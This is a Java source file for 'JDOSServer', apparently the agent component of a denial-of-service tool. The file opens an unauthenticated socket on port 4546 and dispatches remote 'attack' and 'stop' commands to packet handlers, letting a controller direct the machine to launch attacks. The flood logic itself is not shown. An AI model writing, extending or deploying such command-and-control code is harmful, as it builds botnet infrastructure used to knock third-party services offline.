package com.jdos;

import java.io.DataInputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

import com.jdos.packet.Packet;
import com.jdos.packet.impl.AttackPacket;
import com.jdos.packet.impl.StopPacket;

/**
 * A JDOSServer used for attacking.
 * 
 * @author Desmond Jackson
 */
public class JDOSServer extends Object {

	/**
	 * The packets.
	 */
	private static final Packet[] PACKETS = new Packet[] {new AttackPacket(), new StopPacket()};

	/**
	 * The main method.
	 * 
	 * @param args String arguments
	 * 
	 * @throws IOException
	 */
	public static void main(String[] args) throws IOException {
		ServerSocket ss = new ServerSocket(4546);
		while (true) {
			final Socket s = ss.accept();
			new Thread(new Runnable() {

				@Override
				public void run() {
					try {
						DataInputStream din = new DataInputStream(s.getInputStream());
						int id = din.readInt();
						for (Packet packet : PACKETS)
							if (packet.getId() == id)
								packet.execute(din);
						din.close();
						s.close();
					} catch (IOException e) {
						e.printStackTrace();
					}
				}

			}).start();
		}
	}

}
